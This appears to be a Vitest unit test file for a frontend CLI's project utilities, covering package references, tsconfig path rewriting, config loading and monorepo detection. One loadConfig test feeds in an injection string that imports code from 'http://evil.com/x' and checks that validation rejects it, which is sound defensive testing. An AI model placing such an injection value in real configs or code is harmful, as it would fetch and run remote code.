/**
 * Unit tests for project utilities
 *
 */

import { describe, expect, it, beforeAll, afterAll } from 'vitest';
import path from 'path';
import fs from 'fs-extra';
import os from 'os';
import {
  loadConfig,
  findMonorepoRoot,
  getLocalPackageRef,
  rewriteTsconfigPackagePaths,
  CONFIG_FILE,
} from './project.js';
import type { ConfigLoadResult } from '../core/types.js';

function assertTsconfigPathsShape(
  value: unknown
): asserts value is {
  compilerOptions: {
    paths: Record<string, string[]>;
  };
} {
  if (
    typeof value !== 'object' ||
    value === null ||
    !('compilerOptions' in value) ||
    typeof (value as { compilerOptions: unknown }).compilerOptions !== 'object' ||
    (value as { compilerOptions: unknown }).compilerOptions === null ||
    !('paths' in (value as { compilerOptions: { paths?: unknown } }).compilerOptions)
  ) {
    throw new Error('expected tsconfig JSON with compilerOptions.paths');
  }
}

describe('getLocalPackageRef', () => {
  it('should convert @gears-frontx/react to a file: reference', () => {
    const result = getLocalPackageRef('@gears-frontx/react', '/repo', '/repo/app');
    expect(result).toBe('file:../packages/react');
  });

  it('should convert @gears-frontx/framework to a file: reference', () => {
    const result = getLocalPackageRef('@gears-frontx/framework', '/repo', '/repo/app');
    expect(result).toBe('file:../packages/framework');
  });

  it('should handle nested project paths', () => {
    const result = getLocalPackageRef('@gears-frontx/state', '/repo', '/repo/projects/my-app');
    expect(result).toBe('file:../../packages/state');
  });

  it('should return non-@gears-frontx packages unchanged', () => {
    expect(getLocalPackageRef('react', '/repo', '/repo/app')).toBe('react');
    expect(getLocalPackageRef('lodash', '/repo', '/repo/app')).toBe('lodash');
    expect(getLocalPackageRef('@types/node', '/repo', '/repo/app')).toBe('@types/node');
  });
});

describe('rewriteTsconfigPackagePaths', () => {
  const tsconfigContent = JSON.stringify(
    {
      compilerOptions: {
        paths: {
          '@/*': ['./src/*'],
          '@gears-frontx/state': ['../../../state/src/index.ts'],
          '@gears-frontx/state/*': ['../../../state/src/*'],
          '@gears-frontx/react': ['../../../react/src/index.ts'],
          '@gears-frontx/react/*': ['../../../react/src/*'],
        },
      },
    },
    null,
    2
  );

  it('rewrites scaffold tsconfig aliases to installed package paths', () => {
    const rewritten: unknown = JSON.parse(
      rewriteTsconfigPackagePaths(tsconfigContent, {
        useLocalPackages: false,
      })
    );
    assertTsconfigPathsShape(rewritten);

    expect(rewritten.compilerOptions.paths).toEqual({
      '@/*': ['./src/*'],
      '@gears-frontx/state': ['./node_modules/@gears-frontx/state'],
      '@gears-frontx/state/*': ['./node_modules/@gears-frontx/state/*'],
      '@gears-frontx/react': ['./node_modules/@gears-frontx/react'],
      '@gears-frontx/react/*': ['./node_modules/@gears-frontx/react/*'],
    });
  });

  it('rewrites scaffold tsconfig aliases to local monorepo source paths', () => {
    const rewritten: unknown = JSON.parse(
      rewriteTsconfigPackagePaths(tsconfigContent, {
        useLocalPackages: true,
        monorepoRoot: '/repo',
        projectPath: '/repo/apps/demo',
      })
    );
    assertTsconfigPathsShape(rewritten);

    expect(rewritten.compilerOptions.paths).toEqual({
      '@/*': ['./src/*'],
      '@gears-frontx/state': ['../../packages/state/src/index.ts'],
      '@gears-frontx/state/*': ['../../packages/state/src/*'],
      '@gears-frontx/react': ['../../packages/react/src/index.ts'],
      '@gears-frontx/react/*': ['../../packages/react/src/*'],
    });
  });

  it('returns JSONC tsconfig unchanged when no @gears-frontx aliases exist', () => {
    const jsoncTsconfig = `{
  "compilerOptions": {
    "target": "ES2020",

    /* Bundler mode */
    "moduleResolution": "bundler",
    "paths": {
      "@/*": ["./src/*"]
    }
  }
}
`;

    expect(
      rewriteTsconfigPackagePaths(jsoncTsconfig, {
        useLocalPackages: true,
        monorepoRoot: '/repo',
        projectPath: '/repo/apps/demo',
      })
    ).toBe(jsoncTsconfig);
  });

  it('rewrites nested MFE tsconfig extends to the scaffold root tsconfig', () => {
    const mfeTsconfig = `{
  "extends": "../../../packages/cli/template-sources/project/configs/tsconfig.json",
  "include": ["src"],
  "exclude": ["node_modules", "dist"]
}
`;

    expect(
      rewriteTsconfigPackagePaths(mfeTsconfig, {
        useLocalPackages: false,
        tsconfigPath: 'src/mfe_packages/demo-mfe/tsconfig.json',
      })
    ).toBe(`{
  "extends": "../../../tsconfig.json",
  "include": ["src"],
  "exclude": ["node_modules", "dist"]
}
`);
  });
});

describe('loadConfig', () => {
  let tmpDir: string;

  beforeAll(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'frontx-test-loadconfig-'));
  });

  afterAll(async () => {
    await fs.remove(tmpDir);
  });

  it('should return not_found when config file does not exist', async () => {
    expect.assertions(1);
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({
      ok: false,
      error: 'not_found',
      message: expect.stringMatching(/not found/),
    });
  });

  it('should load a valid config', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'shadcn' }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({ ok: true, config: { frontx: true, uikit: 'shadcn' } });
    await fs.remove(configPath);
  });

  it('should load config with uikit "none"', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'none' }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({ ok: true, config: { frontx: true, uikit: 'none' } });
    await fs.remove(configPath);
  });

  it('should return invalid for empty string uikit', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: '' }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({
      ok: false,
      error: 'invalid',
      message: expect.stringMatching(/Invalid "uikit" value/),
    });
    await fs.remove(configPath);
  });

  it('should return invalid for non-string uikit', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 123 }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({
      ok: false,
      error: 'invalid',
      message: expect.stringMatching(/Invalid "uikit" value/),
    });
    await fs.remove(configPath);
  });

  it('should return config when uikit is not present', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({ ok: true, config: { frontx: true } });
    await fs.remove(configPath);
  });

  it('should load config with a custom uikit package', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: '@acronis-platform/shadcn-uikit' }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({
      ok: true,
      config: { frontx: true, uikit: '@acronis-platform/shadcn-uikit' },
    });
    await fs.remove(configPath);
  });

  it('should return invalid for uikit with invalid npm package-name syntax', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: "'; import('http://evil.com/x');" }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({
      ok: false,
      error: 'invalid',
      message: expect.stringMatching(/not a valid npm package name/),
    });
    await fs.remove(configPath);
  });

  it('should return invalid for uikit with spaces', async () => {
    expect.assertions(1);
    const configPath = path.join(tmpDir, CONFIG_FILE);
    await fs.writeFile(configPath, JSON.stringify({ frontx: true, uikit: 'bad package name' }));
    const result: ConfigLoadResult = await loadConfig(tmpDir);
    expect(result).toEqual({
      ok: false,
      error: 'invalid',
      message: expect.stringMatching(/not a valid npm package name/),
    });
    await fs.remove(configPath);
  });
});

describe('findMonorepoRoot', () => {
  let tmpDir: string;

  beforeAll(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'frontx-test-monorepo-'));
  });

  afterAll(async () => {
    delete process.env.FRONTX_MONOREPO_ROOT;
    await fs.remove(tmpDir);
  });

  it('should return null when no monorepo structure is found', async () => {
    expect.assertions(1);
    delete process.env.FRONTX_MONOREPO_ROOT;
    const leaf = path.join(tmpDir, 'some', 'deep', 'path');
    await fs.ensureDir(leaf);
    const result = await findMonorepoRoot(leaf);
    expect(result).toBe(null);
  });

  it('should find monorepo root with packages/react and workspaces', async () => {
    expect.assertions(1);
    delete process.env.FRONTX_MONOREPO_ROOT;
    const monoRoot = path.join(tmpDir, 'mono');
    await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@gears-frontx/react' });
    await fs.writeJson(path.join(monoRoot, 'package.json'), {
      name: 'frontx-monorepo',
      workspaces: ['packages/*'],
    });

    const childDir = path.join(monoRoot, 'apps', 'my-app');
    await fs.ensureDir(childDir);

    const result = await findMonorepoRoot(childDir);
    expect(result).toBe(monoRoot);
  });

  it('should respect FRONTX_MONOREPO_ROOT env variable', async () => {
    expect.assertions(1);
    const monoRoot = path.join(tmpDir, 'env-mono');
    await fs.ensureDir(path.join(monoRoot, 'packages', 'react'));
    await fs.writeJson(path.join(monoRoot, 'packages', 'react', 'package.json'), { name: '@gears-frontx/react' });

    process.env.FRONTX_MONOREPO_ROOT = monoRoot;

    const result = await findMonorepoRoot('/some/random/path');
    expect(result).toBe(path.resolve(monoRoot));

    delete process.env.FRONTX_MONOREPO_ROOT;
  });

  it('should skip directories without workspaces containing packages/', async () => {
    expect.assertions(1);
    delete process.env.FRONTX_MONOREPO_ROOT;
    const fakeRoot = path.join(tmpDir, 'fake-mono');
    await fs.ensureDir(path.join(fakeRoot, 'packages', 'react'));
    await fs.writeJson(path.join(fakeRoot, 'packages', 'react', 'package.json'), { name: '@gears-frontx/react' });
    await fs.writeJson(path.join(fakeRoot, 'package.json'), {
      name: 'not-a-monorepo',
      workspaces: ['apps/*'],
    });

    const child = path.join(fakeRoot, 'apps', 'test');
    await fs.ensureDir(child);

    const result = await findMonorepoRoot(child);
    expect(result).toBe(null);
  });
});
